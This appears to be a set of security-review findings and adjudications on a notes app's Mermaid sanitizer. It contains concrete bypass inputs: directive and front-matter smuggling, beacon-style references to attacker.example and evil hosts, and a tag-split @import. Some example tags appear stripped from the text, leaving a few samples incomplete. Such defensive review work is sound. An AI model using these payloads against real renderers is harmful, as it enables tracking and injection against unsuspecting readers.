samples.summary: stripConfigDirectives() can be defeated by directive re-composition: removing one `%%{…}%%` match splices a surviving `%` onto a following `%{init:…}%%`, producing a live directive mermaid will read
samples.evidence:
`stripConfigDirectives` (mermaid.ts:226-228) is a single `String.replace(DIRECTIVE_RE, '')` pass; the result is never re-scanned. Trace the input a note author can write inside a fence:

```mermaid
%%%{x}%%%{init: {"themeCSS": "…"}}%%
flowchart LR
  A-->B
```

Indices: 0=`%` 1=`%` 2=`%` 3=`{` 4=`x` 5=`}` 6=`%` 7=`%` 8=`%` 9=`{`…
DIRECTIVE_RE (`/%{2}{…/gi`) cannot start at index 0 (index 2 is `%`, not `{`), so the first match starts at index 1: `%{2}`=1,2; `{`=3; `(\w+)`=`x`; the optional body group matches empty because the `(?!}%{2})` lookahead sees `}%%`; `(?:}%{2})?`=5,6,7. The match is exactly `%%{x}%%` (1..7) and `lastIndex` becomes 8. From index 8 the remainder is `%{init: …}%%`, which has no `%%{` pair, so no second match occurs.

After the replace the surviving index-0 `%` is concatenated with index 8 onward, yielding `%%{init: {"themeCSS": "…"}}%%` — a syntactically valid mermaid init directive that `mermaid.render(id, …)` (mermaid.ts:468) then receives and `processDirectives`/`addDirective` honours.

Attack: any workspace collaborator or editor-role share-link visitor authors this fence; every other viewer of the note (including anonymous share-link visitors, shared-document.tsx:315) renders it. What lands in config is then gated only by mermaid's `secure` list (layer 1), which the module's own header comment (mermaid.ts:29-33) argues is insufficient because it pins only top-level keys — so a nested override that the strip was supposed to prevent from ever reaching the engine now reaches it. The correct fix is to loop the replace to a fixed point (or reject the fence outright when a `%%` sequence survives), not to rely on the pinned key list this layer was explicitly designed not to depend on.

samples.summary: stripConfigDirectives() removes only the FIRST front-matter block, promoting a second `---`-delimited block to leading front matter that mermaid then parses as config — the strip creates a carrier that did not exist in the original source
samples.evidence:
`FRONTMATTER_RE` (mermaid.ts:211) is applied once, without the `g` flag, at mermaid.ts:227. Trace this note-authored fence body:

```
---
a: 1
---
---
config:
  themeCSS: "body{display:none}"
---
flowchart LR
  A-->B
```

`FRONTMATTER_RE` = `/^([^\S\n\r]*)-{3}\s*[\n\r](.*?)[\n\r]\1-{3}\s*[\n\r]+/s` with `\1` = ''. The lazy `(.*?)` first succeeds at `a: 1`, `[\n\r]`=`\n`, `-{3}`=`---`, `\s*`='' (it cannot take the following `\n` because `[\n\r]+` would then face `-`), `[\n\r]+`=`\n`. So exactly `---\na: 1\n---\n` is removed and the remainder passed to `mermaid.render()` (mermaid.ts:468) is:

`---\nconfig:\n  themeCSS: "body{display:none}"\n---\nflowchart LR\n  A-->B`

That now begins with a front-matter block, so mermaid's `extractFrontMatter`/`preprocessDiagram` parses it and applies its `config:` — whereas on the ORIGINAL text mermaid would have seen only the first (harmless) block and treated the second as diagram text. The strip therefore manufactures a config carrier rather than removing one, in the one function whose stated job (mermaid.ts:213-224) is that carriers 'never reach the engine' because `secure` pins only top-level keys.

Attack: any note author (collaborator or editor-role share-link visitor) writes the fence; every reader of the note executes the promoted config. Impact is bounded today only by mermaid's `secure` list catching the specific keys enumerated at mermaid.ts:167-184 — the exact single-layer dependence this function exists to avoid. Fix: strip front matter repeatedly until no leading block remains (or reject a fence whose body still starts with `---` after stripping).

samples.summary: A note-authored diagram label can fire an off-site fetch (IP/UA beacon) from every reader's browser: mermaid lays the diagram out in document.body before serializing, and its strict-mode label sanitizer permits , so layer 3's FORBID_TAGS never sees it
samples.evidence: `await mermaid.render(id, …)` at mermaid.ts:468 runs outside sandbox mode, which — as the file's own SECURITY note concedes at mermaid.ts:43-46 — appends a `d` host div to `document.body` and lays the diagram out in the live document before serializing. The note argues that window is guarded by 'mermaid's own strict-mode sanitizing'. That guard stops script execution, not resource loading: mermaid's `sanitizeText` for `securityLevel: 'strict'` runs the label through `removeScript()` and then `DOMPurify.sanitize(text, { FORBID_TAGS: ['style'] })` — DOMPurify's DEFAULT profile, which allows `` and an `https:` `src`. `flowchart.htmlLabels` defaults to true, so the label is inserted as HTML into a `` inside that live host div. Attack: a collaborator or editor-role share-link visitor writes ```mermaid flowchart LR A[""] --> B ``` Every reader who opens the note — including anonymous share-link visitors (shared-document.tsx:315) — issues that request from their browser, disclosing IP, User-Agent and read-receipt timing to an attacker-chosen host. There is no CSP anywhere in the app to block it (grepped for `Content-Security-Policy`/`helmet`: only vendored node_modules hits). The `FORBID_TAGS: ['img','image','audio','video','source','track','input']` at mermaid.ts:249 was added for exactly this beacon threat, but it is applied by `sanitizeSvg()` (mermaid.ts:319) to the SERIALIZED output only — after the fetch has already gone out from the layout host. The `document.getElementById('d'+id)?.remove()` at mermaid.ts:484 removes the host afterwards, which does not un-send the request. Closing this requires either `securityLevel: 'sandbox'`, or passing a restrictive `dompurifyConfig` to mermaid (mermaid honours `config.dompurifyConfig` in `sanitizeText`) so labels are stripped of fetch-capable tags before the engine builds the tree.

samples.summary: The CSS fetch check only inspects <style> elements and style= attributes; SVG presentation attributes (fill/filter/mask/clip-path/marker-*) carrying url(https://…) pass ALLOWED_URI_REGEXP and are never checked
samples.evidence:
`sanitizeSvg()` runs `isSafeCss()` over `querySelectorAll('style')` (mermaid.ts:321) and `querySelectorAll('[style]')` (mermaid.ts:338) only. SVG presentation attributes take the same `url()` reference syntax but are plain attributes, so they are checked only against `ALLOWED_URI_REGEXP` (mermaid.ts:264-265). Trace `fill="url(https://attacker.example/x#g)"`: the value starts with `u`, so the `[^a-z]` branch fails and `(?:https?|mailto):` fails, but the trailing branch `[a-z+.\-]+(?:[^a-z+.\-:]|$)` matches `url` followed by `(` — which is in `[^a-z+.\-:]` — so the attribute is ALLOWED. The same holds for `filter=`, `mask=`, `clip-path=`, `marker-start/mid/end=` and `stroke=`.

This is the same off-page-reference class the `CSS_EXTERNAL_RE` `url\(\s*['"]?\s*(?!#)` rule (mermaid.ts:275) was written to reject, just delivered through an attribute the check does not cover. Exploitability is limited because current Chrome/Firefox/Safari restrict external references for paint servers, filters and markers to the same document, which is why I rate this minor rather than major — but the sanitizer's own stated invariant ('nothing legitimate needs the constructs being rejected', mermaid.ts:316-317) is not actually enforced on these attributes. Consider running `isSafeCss()` over the value of any attribute whose value contains `url(`.

samples.summary: ADD_TAGS allows <use> while ALLOWED_URI_REGEXP allows http(s), so an external <use href="https://…"> reference survives sanitization
samples.evidence:
`ADD_TAGS: ['foreignobject', 'use']` (mermaid.ts:241) re-enables `<use>`, which DOMPurify excludes by default as an external-reference carrier. The accompanying comment says `use` is 'still held to ALLOWED_URI_REGEXP', but that regexp (mermaid.ts:264-265) explicitly permits `https?:` for outbound links, so `<use href="https://attacker.example/x.svg#a"/>` and `<use xlink:href="https://…"/>` both pass. The persisted-output test at preview.test.ts:456 only exercises the in-document `#arrow` case, so nothing pins the external one.

Attack path is the same as the other findings — note-authored content reaching another reader — and the practical impact is limited to a resource fetch, mitigated in current browsers which restrict `<use>` to same-document references. Mermaid only ever emits `#`-local `use` references, so restricting `use`'s `href`/`xlink:href` to values starting with `#` (a small `ALLOWED_URI_REGEXP` per-tag check or a post-pass alongside the existing `<style>` pass) closes it without cost.

samples.summary: Links emitted inside a mermaid diagram bypass the preview's link_open rule that adds rel="noopener noreferrer", so diagram links do not get the hardening ordinary markdown links get
samples.evidence:
`md.renderer.rules.link_open` (preview.ts:106-115) exists specifically so that an `http(s)` link in a note opens with `target="_blank"` and `rel="noopener noreferrer"` — the preview's stated posture that a note must not hand the opened page a `window.opener` reference back. Mermaid's `click X href "…"` syntax still produces `<a href>` under `securityLevel: 'strict'` (strict disables callback functions and runs the URL through `sanitizeUrl`, it does not remove href links), and that anchor is produced by the engine, sanitized by `sanitizeSvg()` (mermaid.ts:319) — which allows `https?:` hrefs — and inserted by `apply()` (mermaid.ts:499) without ever passing through markdown-it's renderer. So a diagram link from an untrusted note author reaches the reader without the `rel` the same author's markdown link would have received, and `click X href "…" _blank` yields `target=_blank` with no `rel`.

Impact is limited (modern browsers imply `noopener` for `target=_blank`, and same-tab navigation is a phishing risk equivalent to a markdown link), hence minor — but it is an inconsistency in a hardening rule this file deliberately applies elsewhere. Adding `rel`/`target` normalization for `a[href^="http"]` in `sanitizeSvg()`'s post-pass would restore parity.

samples.summary: Adding mermaid pulls @iconify/utils → @antfu/install-pkg (a runtime package-manager invoker via tinyexec) into the dependency graph; pnpm audit only fails the lane on CRITICAL
samples.evidence:
`mermaid: ^11.16.0` (packages/notes/package.json:69) resolves, per the lockfile hunk, to `@iconify/utils@3.1.4` → `@antfu/install-pkg@1.1.0` → `package-manager-detector` + `tinyexec` (pnpm-lock.yaml, `'@antfu/install-pkg@1.1.0'` and `'@iconify/utils@3.1.4'` snapshots). `@antfu/install-pkg` exists to shell out to a package manager (`npm/pnpm/yarn install <pkg>`) at runtime; `@iconify/utils`'s filesystem icon-collection loader calls it when a collection is missing. That code is dead on the browser path (the task doc's headless-Chrome run is reasonable evidence for that), but it is now resolvable from a first-party workspace package, so any future Node-side use of the notes package (SSR, a node test, a script importing `@wafflebase/notes`) that reaches mermaid's icon registry can trigger a network install of an attacker-influenceable package name.

I could not construct a concrete reachable path from this repo's code, hence low confidence and minor severity — but it is worth recording because the stated CI posture is that `pnpm audit` fails only on CRITICAL advisories, so nothing in the pipeline will flag this class of transitive capability. Pinning/overriding `@iconify/utils` away, or documenting that mermaid must never be imported from a Node entry point, would bound it.

finding.summary: CSS guard reads `textContent`, but the browser builds the stylesheet from *child text content* — an element child inside an SVG-namespace `<style>` splits `@import`/`url(` past the check
finding.evidence: `isSafeCss(el.textContent ?? '')` (mermaid.ts:286, via CSS_EXTERNAL_RE at :238) inspects the concatenation of ALL descendant text. The CSS engine, per the HTML spec's "update a style block" algorithm, uses only the element's *child text content* (direct Text-node children), skipping element subtrees. The two differ exactly when the `<style>` has an element child, and this pipeline manufactures that case: mermaid builds its stylesheet with `document.createElement('style')` (HTML namespace, RAWTEXT — `<title>` there stays text), then hands us the diagram as a serialized STRING (`mermaid.render` -> `{ svg }`, consumed at mermaid.ts:418). DOMPurify re-parses that string, where the same `<style>` is now a child of `<svg>` and therefore parsed as MARKUP, so `<title>` becomes a real SVG element that DOMPurify keeps (valid SVG tag, valid namespace). Attack: get note-controlled text into mermaid's `<style>` block (mermaid's `createCssStyles` emits `classDef`-derived rules into it) spelled `@imp<title>x</title>ort "https://evil/x.css";`. Sanitizer sees textContent `@impxort "https://evil/x.css";` — no `@import`, no `url(` — keeps the style; the live DOM's child text content is `@import "https://evil/x.css";`, a document-scoped external stylesheet load in every reader's session (IP/UA beacon + full-page restyle), which is precisely the threat the guard is documented to stop. The same split defeats the `url(` rule. Note this also falsifies the doc claim at mermaid.ts:34-37 that there is "no re-serialize/re-parse step" — DOMPurify's output is not re-serialized, but the ENGINE's is, and that is where the namespace flip happens. Mitigation: iterate direct Text children (or drop any `<style>` that has element children at all).

verdict.reason: The exact mitigation the finding requests is already present in the code it cites. In sanitizeSvg() (packages/notes/src/view/mermaid.ts:319), the <style> loop drops any style element that has an element child BEFORE the textContent check: `if (el.firstElementChild) { el.remove(); continue; }` (mermaid.ts:332-335), followed by `if (!isSafeCss(el.textContent ?? '')) el.remove();` (mermaid.ts:336). Since textContent and the spec's "child text content" can only diverge when a <style> has an element child, the described `@imp<title>x</title>ort` split can never reach the textContent comparison — the block is removed whole. The in-file comment at mermaid.ts:322-331 documents that exact HTML-namespace-to-SVG-namespace re-parse vector as the reason for the guard, which also reconciles the doc wording at 34-37. sanitizeSvg is the only sanitizing path for engine output (called once, mermaid.ts:469) and the only `querySelectorAll('style')` in packages/ (grep), so there is no alternate unguarded entry point. The finding's quoted line numbers also do not match this tree (isSafeCss(el.textContent) is at 336 not 286; CSS_EXTERNAL_RE is at 274-275 not 238), consistent with the reviewer reading a pre-guard revision. Non-element splitters do not evade the remaining check: comment nodes are excluded from both textContent and child text content, and CDATASection is a Text node included in both.

verdict.reason: The finding's substance is that the SECURITY note and design doc overstate the posture by presenting layer 3 (`sanitizeSvg`) as a substitute for `securityLevel: 'sandbox'`, and that the in-file comment calls the mermaid host "detached". Both are false in this repository. mermaid.ts:39-52 states verbatim that "layer 3 is NOT an equivalent substitute", describes exactly the alleged window ("mermaid.render() appends its own `d<id>` host div to `document.body`, lays the diagram out there ... the engine's output exists in the reader's live document *before* `sanitizeSvg()` ever sees it"), names what actually guards it (mermaid's strict-mode sanitizing + layer 2's carrier strip), scopes layer 3 to "what persists", and records that sandbox mode is the only way to close the layout window and "that trade is knowingly taken". docs/design/notes/notes.md:397-405 carries the identical caveat. The comment attached to the quoted line (mermaid.ts:478-484) itself says the host is appended to `document.body` and that its failure-path leak holds "the engine's un-DOMPurified output"; grep shows "detached" appears only at mermaid.ts:401 and mermaid.ts:451, both describing preview placeholders, never the mermaid host. Of the three remedies the finding proposes, "correct the documented guarantee" is already satisfied; the other two are an explicitly reasoned, documented tradeoff. No concrete bypass of mermaid's strict-mode sanitizer is identified — script execution in the layout window would require a hypothetical upstream mermaid CVE, i.e. documented residual risk, not a defect present here, and the input reaching the engine is additionally hardened (mermaid.ts:226-228, mermaid.ts:167-184).
